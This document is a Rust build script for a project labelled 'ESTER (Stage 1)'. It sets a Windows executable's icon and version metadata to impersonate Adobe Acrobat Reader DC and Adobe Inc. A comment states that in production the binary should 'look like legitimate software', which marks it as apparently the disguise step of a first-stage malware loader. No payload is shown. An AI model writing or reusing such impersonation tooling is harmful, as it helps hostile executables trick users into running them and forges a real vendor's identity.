// Build script for ESTER (Stage 1)
// Configures Windows resources and manifest

fn main() {
    // Only apply Windows resources on Windows targets
    if std::env::var("CARGO_CFG_WINDOWS").is_ok() {
        let mut res = winres::WindowsResource::new();
        
        // Set application metadata
        // In production, this should look like legitimate software
        res.set_icon("../../pdf_icon.ico")
            .set("ProductName", "Adobe Acrobat Reader DC")
            .set("FileDescription", "Adobe Acrobat Reader DC")
            .set("CompanyName", "Adobe Inc.")
            .set("LegalCopyright", "Copyright (C) 2024 Adobe Inc.")
            .set("FileVersion", "24.1.0.0")
            .set("ProductVersion", "24.1.0.0");
        
        // Compile the resources
        if let Err(e) = res.compile() {
            eprintln!("Warning: Failed to compile Windows resources: {}", e);
        }
    }
}
